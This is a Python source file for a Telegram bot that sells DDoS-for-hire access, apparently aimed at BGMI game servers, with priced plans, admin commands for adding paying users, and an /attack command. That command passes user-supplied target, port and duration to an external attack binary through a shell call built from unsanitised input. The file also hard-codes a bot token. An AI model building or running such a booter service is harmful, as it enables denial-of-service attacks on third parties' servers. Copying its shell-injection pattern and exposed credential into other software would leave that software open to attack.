#!/usr/bin/python3

import telebot
import subprocess
import datetime
import os

# ------------------ CONFIGURATION ------------------
# Replace with your own bot token (use environment variable on Render)
BOT_TOKEN = '8607310920:AAEZWKCoULqvS-lWsY_uhLbC6g5NdWG-vBg'
ADMIN_IDS = ["8640134736"]               # list of admin user IDs (strings)
USER_FILE = "users.txt"                  # stores authorised user IDs
LOG_FILE = "log.txt"                     # stores command logs
COOLDOWN_TIME = 0                        # cooldown in seconds (0 = no cooldown)
# ----------------------------------------------------

bot = telebot.TeleBot(BOT_TOKEN)

# ---------- helper functions for user management ----------
def read_users():
    """Return list of allowed user IDs from file."""
    try:
        with open(USER_FILE, "r") as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        return []

def write_users(user_list):
    """Overwrite the users file with a list of IDs."""
    with open(USER_FILE, "w") as f:
        for uid in user_list:
            f.write(f"{uid}\n")

allowed_user_ids = read_users()          # in‑memory list of authorised users

# ---------- approval & expiry (used by /add and /myinfo) ----------
user_approval_expiry = {}                # dictionary: user_id -> datetime of expiry

def set_approval_expiry_date(user_id, duration, unit):
    """Calculate and store expiry date. Returns True on success."""
    now = datetime.datetime.now()
    if unit in ("hour", "hours"):
        td = datetime.timedelta(hours=duration)
    elif unit in ("day", "days"):
        td = datetime.timedelta(days=duration)
    elif unit in ("week", "weeks"):
        td = datetime.timedelta(weeks=duration)
    elif unit in ("month", "months"):
        td = datetime.timedelta(days=30 * duration)   # approximate
    else:
        return False
    user_approval_expiry[user_id] = now + td
    return True

def get_remaining_approval_time(user_id):
    """Human readable string of remaining approval time."""
    exp = user_approval_expiry.get(user_id)
    if not exp:
        return "N/A"
    remaining = exp - datetime.datetime.now()
    if remaining.total_seconds() < 0:
        return "Expired"
    # format nicely
    days = remaining.days
    hours, rem = divmod(remaining.seconds, 3600)
    mins, _ = divmod(rem, 60)
    return f"{days}d {hours}h {mins}m"

# ---------- logging ----------
def record_command_logs(user_id, command, target=None, port=None, time=None):
    """Write a detailed log line."""
    entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target is not None:
        entry += f" | Target: {target}"
    if port is not None:
        entry += f" | Port: {port}"
    if time is not None:          # careful: 0 is a valid time
        entry += f" | Duration: {time}s"
    with open(LOG_FILE, "a") as f:
        f.write(entry + "\n")

def log_command(user_id, target, port, time):
    """Write a short, user‑friendly log entry."""
    try:
        user_info = bot.get_chat(int(user_id))
        username = f"@{user_info.username}" if user_info.username else f"UserID: {user_id}"
    except:
        username = f"UserID: {user_id}"
    with open(LOG_FILE, "a") as f:
        f.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}s\n\n")

# ---------- cooldown for non‑admin users ----------
bgmi_cooldown = {}

# ---------- bot commands ----------
@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = (
        f"❄️ Welcome to Premium DDoS Bot, {user_name}!\n"
        "This is high‑quality server‑based DDoS.\n"
        "To get access, try /help\n"
        "Buy access: @kingthenos_bhai"
    )
    bot.reply_to(message, response)

@bot.message_handler(commands=['help'])
def show_help(message):
    help_text = (
        "🤖 Available commands:\n"
        "/attack <target> <port> <time> – Launch BGMI attack\n"
        "/rules – Read the rules\n"
        "/mylogs – Your recent attacks\n"
        "/plan – Botnet pricing\n"
        "/myinfo – Your account info\n\n"
        "Admin commands:\n"
        "/admincmd – Show all admin commands\n\n"
        "Buy: @kingthenos_bhai\n"
        "Channel: https://t.me/+Bz7yCgbYk7RkNzQ9"
    )
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = (
        f"{user_name} Please follow these rules ⚠️:\n\n"
        "1. Don't run too many attacks – you may be banned.\n"
        "2. Don't run two attacks at the same time.\n"
        "3. Join https://t.me/+Bz7yCgbYk7RkNzQ9 otherwise it will not work.\n"
        "4. We check logs daily – follow the rules to avoid a ban!"
    )
    bot.reply_to(message, response)

@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = (
        f"{user_name}, only one plan is more powerful than any other DDoS:\n\n"
        "VIP 🌟 :\n"
        "- Attack Time: 300s\n"
        "- Cooldown: 10 sec\n"
        "- Concurrent Attacks: 5\n\n"
        "Price List 💸\n"
        "3 days – 200 Rs\n"
        "1 week – 300 Rs\n"
        "1 month – 500 Rs\n\n"
        "Buy: @kingthenos_bhai"
    )
    bot.reply_to(message, response)

@bot.message_handler(commands=['admincmd'])
def show_admin_cmd(message):
    response = (
        "Admin commands:\n"
        "/add <userid> <duration> – Add user (e.g., /add 123456 1day)\n"
        "/remove <userid> – Remove user\n"
        "/allusers – List authorised users\n"
        "/logs – Get log file\n"
        "/broadcast <msg> – Broadcast a message\n"
        "/clearlogs – Clear log file\n"
        "/clearusers – Clear users file"
    )
    bot.reply_to(message, response)

@bot.message_handler(commands=['myinfo'])
def get_user_info(message):
    user_id = str(message.chat.id)
    user_info = bot.get_chat(user_id)
    username = f"@{user_info.username}" if user_info.username else "N/A"
    role = "Admin" if user_id in ADMIN_IDS else "User"
    expiry = user_approval_expiry.get(user_id, "Not Approved")
    if isinstance(expiry, datetime.datetime):
        expiry = expiry.strftime("%Y-%m-%d %H:%M:%S")
    remaining = get_remaining_approval_time(user_id)
    resp = (
        f"👤 Your Info:\n\n"
        f"🆔 User ID: <code>{user_id}</code>\n"
        f"📝 Username: {username}\n"
        f"🔖 Role: {role}\n"
        f"📅 Expiry: {expiry}\n"
        f"⏳ Remaining: {remaining}"
    )
    bot.reply_to(message, resp, parse_mode="HTML")

@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id not in ADMIN_IDS:
        bot.reply_to(message, "Unauthorized! Buy access: @kingthenos_bhai")
        return
    parts = message.text.split()
    if len(parts) < 3:
        bot.reply_to(message, "Usage: /add <userid> <duration> (e.g., /add 123456 1day)")
        return

    target_user = parts[1]
    duration_str = parts[2].lower()

    # extract numeric value and time unit
    units = ["hour", "hours", "day", "days", "week", "weeks", "month", "months"]
    unit = None
    for u in units:
        if duration_str.endswith(u):
            unit = u
            break
    if unit is None:
        bot.reply_to(message, "Invalid duration. Use e.g. 1hour, 2days, 3weeks, 1month")
        return

    num_part = duration_str[:-len(unit)]
    try:
        duration = int(num_part)
        if duration <= 0:
            raise ValueError
    except ValueError:
        bot.reply_to(message, "Duration must be a positive number.")
        return

    if target_user not in allowed_user_ids:
        allowed_user_ids.append(target_user)
        write_users(allowed_user_ids)
        if set_approval_expiry_date(target_user, duration, unit):
            exp = user_approval_expiry[target_user].strftime("%Y-%m-%d %H:%M:%S")
            bot.reply_to(message, f"User {target_user} added for {duration} {unit}. Expires: {exp}")
        else:
            bot.reply_to(message, "Failed to set expiry.")
    else:
        # User already exists – optionally renew? For now just inform.
        bot.reply_to(message, "User already exists. Remove first to change expiry, or ask admin.")

@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id not in ADMIN_IDS:
        bot.reply_to(message, "Unauthorized!")
        return
    parts = message.text.split()
    if len(parts) < 2:
        bot.reply_to(message, "Usage: /remove <userid>")
        return
    target = parts[1]
    if target in allowed_user_ids:
        allowed_user_ids.remove(target)
        write_users(allowed_user_ids)
        # clean up expiry if exists
        user_approval_expiry.pop(target, None)
        bot.reply_to(message, f"User {target} removed.")
    else:
        bot.reply_to(message, f"User {target} not found.")

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id not in ADMIN_IDS:
        bot.reply_to(message, "Unauthorized!")
        return
    if not allowed_user_ids:
        bot.reply_to(message, "No authorised users.")
        return
    resp = "Authorized Users:\n"
    for uid in allowed_user_ids:
        try:
            info = bot.get_chat(int(uid))
            uname = f"@{info.username}" if info.username else "No username"
            resp += f"- {uname} (ID: {uid})\n"
        except:
            resp += f"- User ID: {uid}\n"
    bot.reply_to(message, resp)

@bot.message_handler(commands=['logs'])
def send_logs(message):
    user_id = str(message.chat.id)
    if user_id not in ADMIN_IDS:
        bot.reply_to(message, "Unauthorized!")
        return
    if os.path.exists(LOG_FILE) and os.path.getsize(LOG_FILE) > 0:
        with open(LOG_FILE, "rb") as f:
            bot.send_document(message.chat.id, f)
    else:
        bot.reply_to(message, "No logs found.")

@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id not in ADMIN_IDS:
        bot.reply_to(message, "Unauthorized!")
        return
    if os.path.exists(LOG_FILE):
        open(LOG_FILE, "w").close()
        bot.reply_to(message, "Logs cleared.")
    else:
        bot.reply_to(message, "Logs already empty.")

@bot.message_handler(commands=['clearusers'])
def clear_users_command(message):
    user_id = str(message.chat.id)
    if user_id not in ADMIN_IDS:
        bot.reply_to(message, "Unauthorized!")
        return
    open(USER_FILE, "w").close()
    allowed_user_ids.clear()
    user_approval_expiry.clear()
    bot.reply_to(message, "All users removed.")

@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id not in ADMIN_IDS:
        bot.reply_to(message, "Unauthorized!")
        return
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(message, "Usage: /broadcast <message>")
        return
    msg = "⚠️ Message from Admin:\n\n" + parts[1]
    fail_count = 0
    for uid in allowed_user_ids:
        try:
            bot.send_message(uid, msg)
        except Exception as e:
            print(f"Failed to send to {uid}: {e}")
            fail_count += 1
    bot.reply_to(message, f"Broadcast sent. Failures: {fail_count}")

@bot.message_handler(commands=['mylogs'])
def show_my_logs(message):
    user_id = str(message.chat.id)
    if user_id not in allowed_user_ids:
        bot.reply_to(message, "You are not authorised.")
        return
    if not os.path.exists(LOG_FILE):
        bot.reply_to(message, "No logs found.")
        return
    with open(LOG_FILE, "r") as f:
        lines = f.readlines()
    user_logs = [l for l in lines if f"UserID: {user_id}" in l]
    if user_logs:
        # show last 10 logs to avoid flooding
        bot.reply_to(message, "Your last logs:\n" + "".join(user_logs[-10:]))
    else:
        bot.reply_to(message, "No logs for you.")

# --------------------- ATTACK HANDLER ---------------------
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = f"@{user_info.username}" if user_info.username else user_info.first_name
    response = (
        f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🚀🚀\n\n"
        f"𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n"
        f"𝐏𝐨𝐫𝐭: {port}\n"
        f"𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n"
        f"𝐌𝐞𝐭𝐡𝐨𝐝: VIP - @kingthenos_bhai KA KALA JADU"
    )
    bot.reply_to(message, response)

@bot.message_handler(commands=['attack'])
def handle_attack(message):
    user_id = str(message.chat.id)
    if user_id not in allowed_user_ids:
        bot.reply_to(message, "🚫 Unauthorized! Buy access: @kingthenos_bhai")
        return

    # cooldown check (admins bypass)
    if user_id not in ADMIN_IDS:
        if user_id in bgmi_cooldown:
            elapsed = (datetime.datetime.now() - bgmi_cooldown[user_id]).total_seconds()
            if elapsed < COOLDOWN_TIME:
                bot.reply_to(message, f"Cooldown active. Wait {COOLDOWN_TIME - elapsed:.0f}s.")
                return
        bgmi_cooldown[user_id] = datetime.datetime.now()

    parts = message.text.split()
    if len(parts) != 4:
        bot.reply_to(message, "Usage: /attack <target> <port> <time>")
        return

    target = parts[1]
    try:
        port = int(parts[2])
        time = int(parts[3])
    except ValueError:
        bot.reply_to(message, "Port and time must be integers.")
        return

    if time > 1000:
        bot.reply_to(message, "Max attack time is 1000 seconds.")
        return
    if time < 1:
        bot.reply_to(message, "Time must be at least 1 second.")
        return

    # log the attack
    record_command_logs(user_id, '/attack', target, port, time)
    log_command(user_id, target, port, time)
    start_attack_reply(message, target, port, time)

    # Run the attack binary in the background (non‑blocking)
    cmd = f"./king {target} {port} {time} 100"
    try:
        subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception as e:
        bot.reply_to(message, f"Failed to start attack: {e}")
        return

    # The attack is now running in the background.
    # The bot is free to process other commands immediately.

# ------------------------------------------------------------

bot.polling(none_stop=True)